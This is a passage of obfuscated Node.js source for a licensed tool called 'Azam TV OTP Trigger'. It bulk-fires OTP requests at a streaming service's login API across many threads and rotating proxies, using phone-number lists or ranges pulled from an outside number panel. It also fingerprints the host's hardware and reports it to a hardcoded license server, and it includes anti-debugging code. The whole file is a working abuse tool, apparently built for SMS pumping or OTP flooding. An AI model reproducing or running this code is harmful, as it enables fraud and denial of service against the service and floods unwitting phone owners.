    onStatus("[1/1] Sending OTP to " + v117 + " (flowType: " + flowType + ")...");
    const v121 = {};
    v121.phone = v117, v121.flowType = flowType;
    const v122 = JSON.stringify(v121),
      v123 = await sendRequest("https://api.aztv.videoready.tv/login/auth/v1/pub/create-otp", "POST", v120, v122, proxy, timeout);
    debugLog(v117, "otp-res", v123.data);
    const v124 = v123.data ? (() => {
      try {
        return JSON.parse(v123.data);
      } catch {
        return {};
      }
    })() : {};
    if (v124.status === true) {
      {
        onStatus("[1/1] ✅ OTP Dispatched");
        const v125 = {};
        return v125.success = true, v125.message = "OTP Triggered (" + flowType + ')', v125.phone = v117, v125.flow = flowType, v125.requestId = v124.requestId, v125;
      }
    } else {
      if (v123.status === 429) {
        throw new Error("Rate Limited (429) — Too many requests from this IP");
      } else {
        {
          const v126 = v124.message || v124.error || "Failed (HTTP " + v123.status + ')',
            v127 = v124.errorCode ? '\x20[' + v124.errorCode + ']' : '';
          throw new Error('' + v126 + v127);
        }
      }
    }
  } catch (v128) {
    const v129 = {};
    return v129.success = false, v129.message = '' + v128.message, v129.phone = v117, v129;
  }
}
if (isMainThread) {
  class Dashboard {
    constructor(v130) {
      {
        this.totalNumbers = v130;
        this.processed = 0;
        this.successful = 0;
        this.failed = 0;
        this.startTime = Date.now();
      }
    }
    ["addLog"](v131, v132) {
      let v133 = '';
      if (v132 === "success") v133 = chalk.hex("#00C9A7").bold(" ✦ NOT REXY") + chalk.hex("#555555")(" │ ") + chalk.hex("#00C9A7")("OTP Sent") + chalk.hex("#555555")(" → ") + chalk.hex("#FFD700").bold(v131.replace("Triggered OTP for ", ''));else {
        if (v132 === "retry") v133 = chalk.hex("#FFD700").bold(" ↻ NOT REXY") + chalk.hex("#555555")(" │ ") + chalk.hex("#FFD700")(v131);else {
          {
            const v134 = v131.match(/\+?\d{7,}/),
              v135 = v134 ? v134[0] : '',
              v136 = v131.replace(/Failed on \S+: /, '').replace(/Fatal error on \S+: /, '');
            v133 = chalk.hex("#FF4466").bold(" ✗ NOT REXY") + chalk.hex("#555555")(" │ ") + chalk.hex("#FF4466")(v135 ? '' + v135 : '') + chalk.hex("#555555")(v135 ? " → " : '') + chalk.hex("#888888")(v136);
          }
        }
      }
      process.stdout.write("\r[K" + v133 + '\x0a'), this.render();
    }
    ["setStatus"](v137) {}
    ["update"]() {}
    ["render"]() {
      const v138 = this.processed / Math.max(this.totalNumbers, 1),
        v139 = (v138 * 100).toFixed(1),
        v140 = 20,
        v141 = Math.round(v138 * v140),
        v142 = v140 - v141,
        v143 = chalk.hex("#00C9A7")('█'.repeat(v141)) + chalk.hex("#333333")('░'.repeat(v142)),
        v144 = '\x20\x20' + chalk.hex("#00C9A7").bold("NOT REXY") + chalk.hex("#555555")(" ⮞ ") + v143 + chalk.hex("#888888")('\x20' + v139 + '%') + chalk.hex("#555555")("  │  ") + chalk.hex("#00C9A7").bold('✓\x20' + this.successful) + chalk.hex("#555555")('\x20\x20') + chalk.hex("#FF4466").bold('✗\x20' + this.failed) + chalk.hex("#555555")("  [" + this.processed + '/' + this.totalNumbers + ']');
      process.stdout.write("\r[K" + v144);
    }
    ["stop"]() {
      process.stdout.write("[2K\r\n");
      const v145 = Math.floor((Date.now() - this.startTime) / 1000),
        v146 = Math.floor(v145 / 60),
        v147 = v145 % 60,
        v148 = v146 + 'm\x20' + v147 + 's';
      console.log(C("  ╔════════════════════════════════════════════╗")), console.log(C("  ║") + W.bold("  AZAM TV OTP TRIGGER — COMPLETE            ") + C('║')), console.log(C("  ╠════════════════════════════════════════════╣")), console.log(C("  ║") + ('\x20\x20' + chalk.greenBright("Successful") + "   " + chalk.greenBright(String(this.successful).padStart(6)) + "                       ") + C('║'));
      console.log(C("  ║") + ('\x20\x20' + chalk.red("Failed") + "       " + chalk.red(String(this.failed).padStart(6)) + "                       ") + C('║')), console.log(C("  ║") + ('\x20\x20' + chalk.cyan("Total Time") + "   " + chalk.cyan(v148.padEnd(6)) + "                       ") + C('║')), console.log(C("  ╚════════════════════════════════════════════╝\n"));
    }
  }
  async function selectOption(v149, v150) {
    return new Promise(v151 => {
      let v152 = 0;
      process.stdin.resume(), readline.emitKeypressEvents(process.stdin);
      if (process.stdin.isTTY) process.stdin.setRawMode(true);
      const fn4 = () => {
        process.stdout.write("[2J[H"), printHeader(), console.log("   [33m" + v149 + "[0m\n");
        v150.forEach((v153, v154) => {
          v154 === v152 ? console.log("   [36m➔[35m " + v153.name + "[0m") : console.log("     [90m" + v153.name + "[0m");
        });
      };
      fn4();
      const fn5 = (v155, v156) => {
        {
          if (v156.ctrl && v156.name === 'c') process.exit(0);
          if (v156.name === 'up') {
            v152 = (v152 - 1 + v150.length) % v150.length, fn4();
          } else {
            if (v156.name === "down") v152 = (v152 + 1) % v150.length, fn4();else v156.name === "return" && (process.stdin.setRawMode(false), process.stdin.removeListener("keypress", fn5), v151(v150[v152].value));
          }
        }
      };
      process.stdin.on("keypress", fn5);
    });
  }
  async function promptText(v157, v158) {
    return new Promise(v159 => {
      {
        process.stdout.write("   [33m" + v157 + "[0m ");
        let v160 = '';
        if (process.stdin.isTTY) process.stdin.setRawMode(false);
        process.stdin.resume();
        const fn6 = v161 => {
          {
            const v162 = v161.toString();
            if (v162.includes('\x0a') || v162.includes('\x0d')) {
              {
                process.stdin.removeListener("data", fn6), v160 += v162.split(/[\r\n]/)[0];
                let v163 = v160.trim();
                if (v163.startsWith('\x22') && v163.endsWith('\x22')) v163 = v163.slice(1, -1);
                v159(v163 || v158);
              }
            } else v160 += v162;
          }
        };
        process.stdin.on("data", fn6);
      }
    });
  }
  async function interactiveWizard() {
    let v164 = 1,
      v165 = "file",
      v166 = "numbers.txt";
    let v167 = null,
      v168 = "none",
      v169 = 20,
      v170 = "SIGN_UP",
      v171 = '',
      v172 = [],
      v173 = 50,
      v174 = "/api/v1/numbers/get";
    const v175 = path.join(__dirname, ".nexa_api_key");
    while (true) {
      process.stdout.write("[2J[H"), printHeader();
      if (v164 === 1) {
        {
          const v176 = await selectOption("SELECT NUMBER SOURCE", [{
            'name': "📁 Load from file (numbers.txt)",
            'value': "file"
          }, {
            'name': "🌐 Auto fetch from NexaOTP Panel",
            'value': "nexa"
          }, {
            'name': "❌ Exit Program",
            'value': "exit"
          }]);
          if (v176 === "exit") process.exit(0);
          v165 = v176, v164 = 2;
        }
      } else {
        if (v164 === 2) {
          {
            if (v165 === "file") {
              const v177 = await selectOption("SELECT TARGET NUMBERS FILE", [{
                'name': "📄 numbers.txt (Default)",
                'value': "numbers.txt"
              }, {
                'name': "✏️ Custom File Path",
                'value': "custom"
              }, {
                'name': "⬅️ Go Back to Number Source",
                'value': "back"
              }]);
              if (v177 === "back") {
                v164 = 1;
                continue;
              }
              if (v177 === "custom") {
                const v178 = await promptText("Enter Numbers File Path:", "numbers.txt");
                if (v178.toLowerCase() === "back") continue;
                v166 = v178;
              } else v166 = v177;
              if (!fs.existsSync(v166)) fs.writeFileSync(v166, '');
              v167 = null, v164 = 3;
            } else {
              let v179 = 1,
                v180 = false;
              while (v179 <= 4 && !v180) {
                {
                  process.stdout.write("[2J[H"), printHeader();
                  if (v179 === 1) {
                    if (fs.existsSync(v175)) {
                      const v181 = fs.readFileSync(v175, "utf8").trim(),
                        v182 = {};
                      v182.name = "Yes, use saved key", v182.value = "yes";
                      const v183 = {};
                      v183.name = "No, enter new key", v183.value = 'no';
                      const v184 = {};
                      v184.name = "Delete saved key", v184.value = "delete";
                      const v185 = {};
                      v185.name = "⬅️ Go Back to Number Source", v185.value = "back";
                      const v186 = await selectOption("Found saved API Key (..." + v181.slice(-4) + "). Use it?", [v182, v183, v184, v185]);
                      if (v186 === "back") {
                        {
                          v180 = true;
                          break;
                        }
                      }
                      if (v186 === "yes") v171 = v181;else {
                        if (v186 === "delete") {
                          if (fs.existsSync(v175)) fs.unlinkSync(v175);
                          v171 = '';
                        }
                      }
                    }
                    if (!v171) {
                      {
                        const v187 = await promptText("Enter NexaOTP API Key (type 'back' to go back):", '');
                        if (v187.toLowerCase() === "back") {
                          v180 = true;
                          break;
                        }
                        v171 = v187;
                        const v188 = {};
                        v188.name = 'No', v188.value = 'no';
                        const v189 = await selectOption("Save this key for future use?", [{
                          'name': "Yes, save it",
                          'value': "yes"
                        }, v188]);
                        v189 === "yes" && v171 && fs.writeFileSync(v175, v171, "utf8");
                      }
                    }
                    if (v171) v179 = 2;
                  } else {
                    if (v179 === 2) {
                      {
                        v172 = [];
                        let v190 = true;
                        while (v190) {
                          {
                            const v191 = await promptText("Enter range #" + (v172.length + 1) + " (e.g. 21624485XXX) or type 'back':", '');
                            if (v191.toLowerCase() === "back") {
                              if (v172.length === 0) {
                                {
                                  v179 = 1;
                                  break;
                                }
                              } else {
                                v172.pop();
                                continue;
                              }
                            }
                            if (v191) v172.push(v191);
                            const v192 = await selectOption("Added " + v172.length + " range(s). Add another?", [{
                              'name': "Yes, add another range",
                              'value': "yes"
                            }, {
                              'name': "No, proceed to next step",
                              'value': 'no'
                            }, {
                              'name': "⬅️ Go Back to API Key",
                              'value': "back"
                            }]);
                            if (v192 === "back") {
                              {
                                v179 = 1;
                                break;
                              }
                            }
                            if (v192 === 'no') v190 = false;
                          }
                        }
                        if (v172.length > 0) v179 = 3;
                      }
                    } else {
                      if (v179 === 3) {
                        const v193 = await promptText("How many numbers to process? (type 'back' to go back) [default: 50]:", '50');
                        if (v193.toLowerCase() === "back") {
                          {
                            v179 = 2;
                            continue;
                          }
                        }
                        v173 = parseInt(v193) || 50, v179 = 4;
                      } else {
                        if (v179 === 4) {
                          {
                            const v194 = await selectOption("SELECT NEXA SERVER", [{
                              'name': "Server 1 (/get)",
                              'value': "/api/v1/numbers/get"
                            }, {
                              'name': "Server 2 (/p2/get)",
                              'value': "/api/v1/numbers/p2/get"
                            }, {
                              'name': "Server 3 (/p3/get)",
                              'value': "/api/v1/numbers/p3/get"
                            }, {
                              'name': "⬅️ Go Back to Count Input",
                              'value': "back"
                            }]);
                            if (v194 === "back") {
                              {
                                v179 = 3;
                                continue;
                              }
                            }
                            v174 = v194;
                            const v195 = {};
                            v195.apiKey = v171, v195.ranges = v172, v195.totalCount = v173, v195.serverEndpoint = v174, v167 = v195, v179 = 5;
                          }
                        }
                      }
                    }
                  }
                }
              }
              if (v180) {
                v164 = 1;
                continue;
              }
              v164 = 3;
            }
          }
        } else {
          if (v164 === 3) {
            {
              const v196 = await selectOption("SELECT PROXIES FILE", [{
                'name': "📄 proxies.txt (Default)",
                'value': "proxies.txt"
              }, {
                'name': "🚫 None (Direct Connection)",
                'value': "none"
              }, {
                'name': "✏️ Custom File Path",
                'value': "custom"
              }, {
                'name': "⬅️ Go Back to Numbers Selection",
                'value': "back"
              }]);
              if (v196 === "back") {
                v164 = 2;
                continue;
              }
              if (v196 === "custom") {
                const v197 = await promptText("Enter Proxies File Path:", "proxies.txt");
                if (v197.toLowerCase() === "back") continue;
                v168 = v197;
              } else v196 === "none" ? v168 = '' : v168 = v196;
              v164 = 4;
            }
          } else {
            if (v164 === 4) {
              {
                const v198 = await selectOption("SELECT THREADS", [{
                  'name': "10 Threads",
                  'value': 0xa
                }, {
                  'name': "20 Threads (Default)",
                  'value': 0x14
                }, {
                  'name': "50 Threads (Fast)",
                  'value': 0x32
                }, {
                  'name': "100 Threads (Extreme)",
                  'value': 0x64
                }, {
                  'name': "⌨️ Custom...",
                  'value': "custom"
                }, {
                  'name': "⬅️ Go Back to Proxies Selection",
                  'value': "back"
                }]);
                if (v198 === "back") {
                  v164 = 3;
                  continue;
                }
                if (v198 === "custom") {
                  const v199 = await promptText("Enter custom number of threads (type 'back' to go back):", '20');
                  if (v199.toLowerCase() === "back") continue;
                  v169 = parseInt(v199) || 20;
                } else v169 = v198;
                v164 = 5;
              }
            } else {
              if (v164 === 5) {
                {
                  const v200 = await selectOption("SELECT FLOW TYPE", [{
                    'name': "🆕 SIGN_UP  (New Account OTP)",
                    'value': "SIGN_UP"
                  }, {
                    'name': "🔑 SIGN_IN  (Login OTP)",
                    'value': "SIGN_IN"
                  }, {
                    'name': "🔄 AUTO     (Detect per account)",
                    'value': "AUTO"
                  }, {
                    'name': "⬅️ Go Back to Threads Selection",
                    'value': "back"
                  }]);
                  if (v200 === "back") {
                    v164 = 4;
                    continue;
                  }
                  v170 = v200, v164 = 6;
                }
              } else {
                if (v164 === 6) {
                  break;
                }
              }
            }
          }
        }
      }
    }
    return process.stdin.pause(), {
      'numbersFile': v166,
      'threads': String(v169),
      'proxiesFile': v168,
      'flow': v170,
      'nexaConfig': v167
    };
  }
  function generateHWID() {
    const v201 = require('os');
    const v202 = v201.platform();
    try {
      {
        if (v202 === "win32") {
          const v203 = execSync('C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -Command "$mg = (Get-ItemProperty \'HKLM:\\SOFTWARE\\Microsoft\\Cryptography\' -ErrorAction SilentlyContinue).MachineGuid; $cpu = (Get-CimInstance Win32_Processor -ErrorAction SilentlyContinue | Select-Object -First 1).ProcessorId; $disk = (Get-CimInstance Win32_LogicalDisk -Filter \'DeviceID=\\\'C:\\\'\' -ErrorAction SilentlyContinue).VolumeSerialNumber; $mb = (Get-CimInstance Win32_BaseBoard -ErrorAction SilentlyContinue).SerialNumber; Write-Output (($mg,$cpu,$disk,$mb) -join \'|\')"', {
            'stdio': "pipe",
            'timeout': 0x3a98
          }).toString().trim();
          if (!v203) throw new Error("No hardware data");
          const v204 = crypto.createHash("sha256").update(v203).digest("hex").toUpperCase();
          return "SKING-" + v204.substring(0, 8) + '-' + v204.substring(8, 12) + '-' + v204.substring(12, 16);
        } else {
          let v205 = [];
          try {
            {
              const v209 = execSync("settings get secure android_id 2>/dev/null || echo \"\"", {
                'stdio': "pipe",
                'timeout': 0x1388
              }).toString().trim();
              if (v209 && v209 !== "null") v205.push('A:' + v209);
            }
          } catch (v210) {}
          try {
            if (fs.existsSync("/proc/cpuinfo")) {
              const v211 = fs.readFileSync("/proc/cpuinfo", "utf8"),
                v212 = v211.match(/Serial\s*:\s*(\S+)/i),
                v213 = v211.match(/Hardware\s*:\s*(.+)/i);
              if (v212 && v212[1] !== "0000000000000000") v205.push('S:' + v212[1].trim());
              if (v213) v205.push('H:' + v213[1].trim());
            }
          } catch (v214) {}
          try {
            {
              if (fs.existsSync("/etc/machine-id")) {
                const v215 = fs.readFileSync("/etc/machine-id", "utf8").trim();
                if (v215) v205.push('M:' + v215);
              }
            }
          } catch (v216) {}
          try {
            const v217 = v201.cpus(),
              v218 = v217 && v217.length > 0 ? v217[0].model : "UnknownCPU",
              v219 = v201.totalmem(),
              v220 = v201.release(),
              v221 = v201.hostname();
            v205.push('F:' + v218 + '|' + v219 + '|' + v220 + '|' + v221);
          } catch (v222) {}
          const v206 = v205.join('||'),
            v207 = crypto.createHash("sha256").update(v206).digest("hex").toUpperCase(),
            v208 = require('os').platform() === "android" ? "ANKING-" : "SKING-";
          return v208 + v207.substring(0, 8) + '-' + v207.substring(8, 12) + '-' + v207.substring(12, 16);
        }
      }
    } catch (v223) {
      return '';
    }
  }
  function verifyServerSignature(v224, v225) {
    if (!v225) return false;
    const v226 = "-----BEGIN PUBLIC KEY-----\nMCowBQYDK2VwAyEAIU7Pc75ao+Fn7XGC7kFGeDh7JAs3o4NSL2LgmN0YmfY=\n-----END PUBLIC KEY-----";
    try {
      return crypto.verify(null, Buffer.from(v224, "utf8"), v226, Buffer.from(v225, "base64"));
    } catch (v227) {
      return false;
    }
  }
  async function start() {
    const v228 = generateHWID();
    !v228 && (console.error(R("\n  ✗ Could not generate Hardware ID. Run on Windows.\n")), process.exit(1));
    const v229 = generateHWID();
    v229 !== v228 && (console.error(R("\n  ✗ HWID integrity check failed. Tampering detected.\n")), process.exit(1));
    printHeader(), console.log(W("┌──────────────────────────────────────────────┐")), console.log(W("│ [•] Tool      : ") + B("Azam TV OTP Trigger          ") + W('│')), console.log(W("│ [•] Your HWID : ") + C(v228.padEnd(29)) + W('│')), console.log(W("│ [•] Status    : ") + Y("Verifying License...         ") + W('│')), console.log(W("└──────────────────────────────────────────────┘")), console.log('');
    let v230 = false,
      v231 = "Licensed";
    const v232 = Date.now();
    try {
      {
        const v252 = "188.137.176.163",
          v253 = require("http"),
          v254 = await new Promise((v255, v256) => {
            const v257 = {};
            v257.hwid = v228;
            v257.app_id = "azamtv";
            v257.version = "1.0.0", v257.timestamp = v232;
            const v258 = JSON.stringify(v257),
              v259 = {
                'hostname': v252,
                'port': 0xec1,
                'path': "/api/verify",
                'method': "POST",
                'headers': {
                  'Content-Type': "application/json",
                  'Content-Length': Buffer.byteLength(v258)
                },
                'timeout': 0x2710
              },
              v260 = v253.request(v259, v261 => {
                let v262 = '';
                v261.on("data", v263 => v262 += v263);
                v261.on("end", () => {
                  try {
                    v255(JSON.parse(v262));
                  } catch (v264) {
                    v256(v264);
                  }
                });
              });
            v260.on("error", v256), v260.on("timeout", function () {
              this.destroy();
              v256(new Error("Timeout"));
            }), v260.write(v258);
            v260.end();
          });
        if (v254) {
          v254.status === "update_required" && (console.error(R("\n  ✗ Update required! Please download the latest version.\n")), process.exit(1));
          if (v254.status === "banned" || v254.status === "expired" || !v254.sig) {
            await new Promise(v268 => setTimeout(v268, 2000));
            let v267 = String(v254.reason || "NOT REGISTERED");
            if (!v254.reason && !v254.sig) v267 = "NOT REGISTERED / REMOVED";
            console.error(R("\n  ╔══════════════════════════════════════════════╗")), console.error(R("  ║    ✗ UNAUTHORIZED HARDWARE — AZTV TOOL      ║")), console.error(R("  ╠══════════════════════════════════════════════╣")), console.error(R("  ║  HWID   : ") + Y(v228.padEnd(33)) + R('║')), console.error(R("  ║  Status : " + v267.padEnd(26) + '║')), console.error(R("  ║  Contact: t.me/Rex_OTP_Tool to register     ║")), console.error(R("  ╚══════════════════════════════════════════════╝\n")), process.exit(1);
          }
          const v265 = v228 + "|azamtv|1.0.0|" + v232;
          !verifyServerSignature(v265, v254.sig) && (console.error(R("\n  ✗ Internal Server Error (500). Please try again later.\n")), process.exit(1));
          v230 = true;
          let v266 = v254.token;
          !v266 && (console.error(R("\n  ✗ Invalid Server Response: Missing Active Session Token. Aborting.\n")), process.exit(1)), setInterval(() => {
            !v266 && (console.error(R("\n  ✗ Session Token lost. Aborting...\n")), process.exit(1));
            const v269 = {};
            v269.hwid = v228, v269.app_id = "azamtv", v269.token = v266;
            const v270 = JSON.stringify(v269),
              v271 = {
                'hostname': v252,
                'port': 0xec1,
                'path': "/api/ping",
                'method': "POST",
                'headers': {
                  'Content-Type': "application/json",
                  'Content-Length': Buffer.byteLength(v270)
                },
                'timeout': 0x1388
              };
            const v272 = v253.request(v271, v273 => {
              {
                let v274 = '';
                v273.on("data", v275 => v274 += v275), v273.on("end", () => {
                  try {
                    const v276 = JSON.parse(v274);
                    v276.status === 'ok' && v276.token ? v266 = v276.token : (console.error(R("\n  ✗ Session invalidated by server (kill). Exiting...\n")), process.exit(1));
                  } catch (v277) {
                    console.error(R("\n  ✗ Network error during session ping. Exiting...\n")), process.exit(1);
                  }
                });
              }
            });
            v272.on("error", () => {
              console.error(R("\n  ✗ Disconnected from License Server. Exiting...\n")), process.exit(1);
            }), v272.on("timeout", function () {
              this.destroy();
              console.error(R("\n  ✗ License Server timeout. Exiting...\n"));
              process.exit(1);
            });
            v272.write(v270), v272.end();
          }, 45000);
        }
      }
    } catch (v278) {
      console.error(R("\n  ✗ License server is currently undergoing maintenance or is unreachable.")), console.error(R("    Please check your internet connection or try again later.\n")), process.exit(1);
    }
    !v230 && (console.error(R("\n  ✗ License verification failed. Exiting.\n")), process.exit(1));
    let v233 = process.argv.slice(2),
      v234 = null;
    if (v233.length === 0) {
      const v279 = await interactiveWizard();
      v233 = [v279.numbersFile, v279.threads, v279.proxiesFile, v279.flow], v234 = v279.nexaConfig;
    }
    let v235 = path.resolve(v233[0] || "numbers.txt"),
      v236 = parseInt(v233[1]) || 20,
      v237 = v233[2] !== undefined ? v233[2] : "proxies.txt";
    if (v237.toLowerCase() === "none") v237 = '';
    let v238 = v233[3] || "SIGN_UP";
    const v239 = generateHWID();
    v239 !== v228 && (console.error(R("\n  ✗ CRITICAL SECURITY ALERT: Runtime memory injection detected.")), console.error(R("  ✗ HWID mismatch during execution sequence. Aborting...\n")), process.exit(1));
    printHeader(), console.log(B("  ✓ License: " + v231) + G(" | HWID: " + v228));
    let v240 = [];
    !v234 && (!fs.existsSync(v235) && (console.error(R("✗ Error: Numbers file not found: " + v235)), process.exit(1)), v240 = fs.readFileSync(v235, "utf8").split(/\r?\n/).map(v280 => v280.trim()).filter(v281 => v281.length > 5));
    let v241 = [];
    if (v237 && fs.existsSync(v237)) {
      v241 = fs.readFileSync(v237, "utf8").split('\x0a').map(v282 => v282.trim()).filter(v283 => v283.length > 0);
    }
    let v242 = v241.map(parseProxy).filter(Boolean);
    v234 ? console.log(C("✓ Target  : NexaOTP API (" + v234.totalCount + " numbers)")) : console.log(C("✓ Loaded " + v240.length + " targets"));
    if (v242.length === 0) console.log(G("  No proxies configured (running direct)"));else console.log(G("  Proxies loaded: " + v242.length));
    console.log(C("✓ Threads : " + v236)), console.log(C("✓ Flow    : " + v238 + '\x0a')), fs.writeFileSync(SUCCESSFUL_FILE, ''), fs.writeFileSync(FAILED_FILE, ''), fs.writeFileSync(DEBUG_FILE, "=== DEBUG SESSION " + new Date().toISOString() + " ===\n");
    const v243 = new Dashboard(v234 ? v234.totalCount : v240.length);
    let v244 = [],
      v245 = [],
      v246 = 0,
      v247 = false;
    if (v234) {
      (async () => {
        try {
          for (let v284 = 0; v284 < v234.totalCount; v284++) {
            try {
              {
                const v285 = v234.ranges[Math.floor(Math.random() * v234.ranges.length)],
                  v286 = await nexaLimiter.enqueue(() => nexaFetchNumber(v234.apiKey, v285, v234.serverEndpoint));
                if (v286) {
                  {
                    v246++;
                    if (v245.length > 0) {
                      v245.shift()(v286);
                    } else v244.push(v286);
                  }
                }
              }
            } catch (v287) {
              {
                if (v287.message.includes("Insufficient balance") || v287.message.includes("No numbers available")) {
                  break;
                }
              }
            }
          }
        } finally {
          {
            v247 = true;
            while (v245.length > 0) v245.shift()(null);
          }
        }
      })();
    }
    const v248 = v234 ? () => {
        {
          if (v244.length > 0) return Promise.resolve(v244.shift());
          if (v247) return Promise.resolve(null);
          return new Promise(v288 => v245.push(v288));
        }
      } : () => {
        if (v240.length === 0) return Promise.resolve(null);
        const v289 = Math.floor(Math.random() * v240.length);
        return Promise.resolve(v240.splice(v289, 1)[0]);
      },
      fn7 = () => {
        if (v242.length === 0) return null;
        const v290 = v242[Math.floor(Math.random() * v242.length)];
        return rotateSessionId(v290);
      };
    function fn8(v291) {
      try {
        const v292 = fs.readFileSync(v235, "utf8"),
          v293 = v292.split(/\r?\n/).filter(v294 => v294.trim() !== v291.trim()).join('\x0a');
        fs.writeFileSync(v235, v293);
      } catch (v295) {}
    }
    const v249 = v234 ? Math.min(v236, v234.totalCount) : Math.min(v236, v240.length),
      v250 = [],
      v251 = setInterval(() => v243.render(), 500);
    async function fn9(v296) {
      while (true) {
        {
          const v297 = await v248();
          if (!v297) break;
          try {
            {
              const v298 = await triggerOTP(v297, {
                'onStatus': v299 => v243.setStatus("Worker " + v296 + ':\x20' + v299),
                'proxy': fn7(),
                'workerId': v296,
                'flowType': v238 === "AUTO" ? "SIGN_UP" : v238
              });
              if (v298.success) {
                {
                  {
                    v243.successful++;
                    v243.processed++;
                    fn8(v297);
                    fs.appendFileSync(SUCCESSFUL_FILE, v298.phone + "|OTP_SENT|" + (v298.flow || v238) + '\x0a');
                    v243.addLog("Triggered OTP for " + v298.phone, "success");
                  }
                }
              } else v243.failed++, v243.processed++, fs.appendFileSync(FAILED_FILE, v298.phone + '|' + v298.message + '\x0a'), v243.addLog("Failed on " + v298.phone + ':\x20' + v298.message, "error");
            }
          } catch (v300) {
            v243.failed++, v243.processed++, v243.addLog("Fatal error on " + v297 + ':\x20' + v300.message, "error");
          }
        }
      }
    }
    for (let v301 = 0; v301 < v249; v301++) v250.push(fn9(v301));
    await Promise.all(v250), clearInterval(v251), v243.render(), v243.stop();
  }
  start()["catch"](v302 => {
    console.error(R("Fatal error: " + v302.message)), process.exit(1);
  });
}
function fn2(v303) {
  function fn10(v304) {
    {
      fn10(++v304);
    }
  }
  try {
    {
      if (v303) {
        return fn10;
      } else fn10(0);
    }
  } catch (v305) {}
}